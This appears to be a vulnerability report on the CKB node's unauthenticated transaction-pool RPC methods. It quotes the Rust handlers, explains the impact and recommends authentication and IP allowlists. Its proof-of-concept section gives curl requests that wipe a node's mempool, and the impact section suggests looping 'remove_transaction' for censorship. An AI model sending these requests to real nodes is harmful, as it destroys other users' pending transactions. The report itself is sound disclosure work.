### Title
Unauthenticated `clear_tx_pool` RPC Allows Any Caller to Wipe the Entire Transaction Pool — (File: `rpc/src/module/pool.rs`)

---

### Summary

The `clear_tx_pool` RPC method removes every pending transaction from the node's transaction pool without any access control check. The CKB RPC server has no built-in authentication mechanism, so any HTTP client that can reach the RPC port can invoke this destructive admin operation. This is the direct analog of the Comet `set_freeze_status` bug: a function intended to be admin-only has no access control enforcement in the code itself, allowing an unprivileged RPC caller to disrupt the pool for all users of that node.

---

### Finding Description

**Root cause — `clear_tx_pool` in `rpc/src/module/pool.rs`:**

The trait declaration marks `clear_tx_pool` as a public RPC method with no parameters and no caller identity:

```rust
// rpc/src/module/pool.rs  lines 322-323
#[rpc(name = "clear_tx_pool")]
fn clear_tx_pool(&self) -> Result<()>;
```

The implementation immediately calls the destructive pool operation with no authentication, no IP check, and no token validation:

```rust
// rpc/src/module/pool.rs  lines 684-692
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

There is no guard of the form "only the node operator may call this." The RPC server itself has no authentication middleware — the entire security model is documented as a network-level concern ("Allowing arbitrary machines to access the JSON-RPC port is **dangerous and strongly discouraged**"), but that warning is not enforced in code.

The same pattern applies to `remove_transaction` (lines 662–669) and `clear_tx_verify_queue` (lines 694–700), which allow targeted removal of individual transactions and clearing of the verification queue respectively, also with zero access control.

**Attacker-controlled entry path:**

```
Attacker (HTTP client)
  → POST http://<node-ip>:8114/  {"method":"clear_tx_pool","params":[]}
  → PoolRpcImpl::clear_tx_pool()  [no auth check]
  → TxPoolController::clear_pool()
  → All pending/proposed transactions wiped
```

The RPC port (default 8114) is plain HTTP. No credentials, no token, no signature are required. Any caller who can reach the port — including via SSRF from a co-located service, a misconfigured firewall, or a node operator who intentionally exposes the RPC for dApp or monitoring use — can trigger this.

---

### Impact Explanation

- **Complete mempool wipe**: Every pending and proposed transaction is removed from the pool. Users who submitted transactions must detect the loss and resubmit, paying fees again.
- **Transaction censorship**: An attacker can call `remove_transaction` in a loop to selectively evict high-value or targeted transactions, enabling front-running or censorship without touching consensus.
- **Service degradation**: Miners relying on this node for block templates receive empty or near-empty templates immediately after the wipe, reducing fee revenue.
- **No recovery signal**: The node does not broadcast the wipe to peers; affected users must poll `get_transaction` to discover their transactions are gone.

The impact class matches the Comet report: *permanent disruption of normal operation by an unprivileged caller*.

---

### Likelihood Explanation

- The RPC port is HTTP with no authentication layer in the code.
- Many production node operators expose the RPC port for legitimate purposes: dApp backends, block explorers, monitoring dashboards, and wallet services all commonly connect to a node's RPC.
- The attacker needs only TCP connectivity to port 8114 — no key, no credential, no privileged role.
- The attack is a single HTTP POST request; it is trivially scriptable and repeatable.
- The documentation warning ("strongly discouraged") does not prevent exposure; it is advisory only.

---

### Recommendation

1. **Add an authentication token** to the RPC server. Destructive methods (`clear_tx_pool`, `remove_transaction`, `clear_tx_verify_queue`, `set_ban`, `clear_banned_addresses`) should require a bearer token or HMAC that is configured at node startup and checked in a middleware layer before the handler is invoked.
2. **Enforce an IP allowlist at the code level** for admin-class RPC methods, independent of firewall configuration.
3. **Separate admin and public RPC surfaces** onto different listen addresses/ports so operators can expose read-only methods publicly while keeping destructive methods on a localhost-only socket.

---

### Proof of Concept

**Preconditions**: Attacker has TCP access to the node's RPC port (8114 by default). No credentials required.

**Step 1 — Confirm transactions are in the pool:**
```bash
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":1}'
# Returns list of pending tx hashes
```

**Step 2 — Wipe the entire pool as an unprivileged caller:**
```bash
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":2}'
# Returns: {"jsonrpc":"2.0","result":null,"id":2}
```

**Step 3 — Confirm pool is empty:**
```bash
curl -s -X POST http://<node-ip>:8114/ \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":3}'
# Returns empty pending/proposed sets
```

**Expected outcome**: All previously pending transactions are gone. Users who submitted them receive no notification; their transactions must be resubmitted. The attack can be repeated continuously to keep the pool empty. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L694-700)
```rust
    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
```
